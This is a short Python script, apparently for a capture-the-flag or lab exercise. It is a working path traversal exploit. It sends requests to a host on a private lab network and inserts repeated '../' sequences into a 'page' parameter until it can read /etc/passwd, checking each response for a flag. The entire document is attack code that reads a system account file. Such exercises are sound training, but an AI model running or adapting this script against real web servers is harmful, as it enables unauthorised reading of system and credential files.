import requests

def path_traversal_request(url):
	response = requests.get(url)
	return response.text

if __name__ == "__main__":
	base_url = "http://192.168.56.101/"
	file_path = "/etc/passwd"

	path_traversal_url = base_url + "?page="
	for i in range (1, 10):
		new_path = "../" * i + "etc/passwd"
		response_text = path_traversal_request(path_traversal_url + new_path)
		print(response_text.split('\n')[0])
		if "flag" in response_text:
			print("Flag found !")
			break
